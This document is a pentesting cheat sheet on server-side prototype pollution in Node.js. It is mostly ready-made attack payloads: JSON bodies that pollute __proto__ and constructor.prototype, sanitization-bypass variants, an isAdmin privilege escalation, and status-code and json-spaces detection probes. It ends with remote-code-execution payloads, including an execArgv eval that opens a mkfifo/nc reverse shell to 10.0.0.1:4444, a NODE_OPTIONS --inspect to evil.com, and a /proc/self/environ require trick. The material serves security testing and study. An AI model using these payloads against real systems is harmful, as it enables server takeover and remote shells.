---
title: Prototype Pollution in Server-Side
description: Prototype Pollution is a JavaScript vulnerability that allows attackers to add arbitrary properties to global object prototypes. The vulnerability may exist in Node.js applications.
tags:
    - Linux
    - Privilege Escalation
    - Web
refs:
    - https://portswigger.net/web-security/prototype-pollution/server-side
    - https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce
    - https://security.snyk.io/vuln/SNYK-JS-MERGE-1040469
date: 2023-08-11
draft: false
---

## Investigation

If the properties is affected by our pollution, our polluted properties might be injected into the target object as follow.

```json
POST /user/update HTTP/1.1
Host: example.com
...

{
    "name": "john",
    "email": "john@example.com",
    "__proto__": {
        "foo": "bar"
    }
}

// Other option
{
    "name": "john",
    "email": "john@example.com",
    "constructor": {
        "prototype": {
            "foo": "bar"
        }
    }
}

// Bypass sanitization 1
{
    "name": "john",
    "email": "john@example.com",
    "__pro__proto__to__": {
        "foo": "bar"
    }
}

// Bypass sanitization 2
{
    "name": "john",
    "email": "john@example.com",
    "constconstructorructor": {
        "prototype": {
            "foo": "bar"
        }
    }
}
```

If our property is added into the target object as below, we can inject malicious property which leads to privilege escalation, reverse shell, so on.

```json
{
    "name": "john",
    "email": "john@example.com",
    "isAdmin": false,
    "foo": "bar"
}
```

<br />

## Privilege Escalation

```json
{
    "name": "john",
    "email": "john@example.com",
    "__proto__": {
        "isAdmin": true
    }
}
```

<br />

## JSON Spaces Overriding

Inject the additional property whose key contains spaces, and send request.

```json
POST /user/update HTTP/1.1

{
    "name": "john",
    "email": "john@example.com",
    "__proto__": {
        "json spaces": 10
    }
}
```

In response, if indents is added at the json body as below, the polluted property affects the server.  
To check that in Burp Suite, click **Raw** tab in HTTP response window. 

```json
{
            "name": "john",
            "email": "john@example.com",
            "json spaces": 10
}
```

<br />

## Status Code Overriding

First off, cause syntax error deliberately by removing comma in the json body when sending POST request.

```json
POST /user/update HTTP/1.1

{
    "name": "john"
    "email": "john@example.com"
}
```

Of course we receive the error response as json object that might contain **"status"** or **"statusCode"** like below.

```json
{
    "error":{
        "status":500,
        "message":"Json parse error"
    }
}
```

Now we try to update the status code to arbitrary number (**400-599**) and observe if the status code will be changed.  
We need to send correct json format at the time because we want to apply our payload.

```json
POST /user/update HTTP/1.1

{
    "name": "john",
    "email": "john@example.com",
    "__proto__": {
        "status": 555
    }
}
```

Finally we can check if our polluted property affects the server status by sending the incorrect json format body again.  

```json
POST /user/update HTTP/1.1

{
    "name": "john"
    "email": "john@example.com"
}
```

If the server responses the error contains the modified status code, the vulnerability of the prototype pollution exists in the web server.

```json
{
    "error":{
        "status":555,
        "message":"Json parse error"
    }
}
```

<br />

## Remote Code Execution (RCE)

Reference: [https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce)

It may often occur in the **`child_process`** module in Node.

```json
"__proto__": {
    "shell": "node",
    "NODE_OPTIONS": "--inspect=evil\"\".com"
}
```

- **shell**: It enables us to set a specific shell such as **`sh`**, **`bash`**, in which to run commands.
- **NODE_OPTIONS**: The environment variable that defines the command-line arguments.

### RCE via child_process.spawn(), child_process.fork()

```json
"__proto__": {
    "execArgv": [
        "--eval=require('child_process').execSync('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f')"
]}
```

### Overwrite Environment Variable

Below also can be achieved. 

```json
"constructor":{
	"prototype":{
		"env":{
			"xyz":"require('child_process').execSync('whoami').toString()"
		},
		"NODE_OPTIONS":"--require /proc/self/environ"
	}
}
```

- **`env`**  
    Set the value of the `xyz` to environment variables.
    
- **`--require /proc/self/environ`**  
    Inject environment variables from the current process as a module.
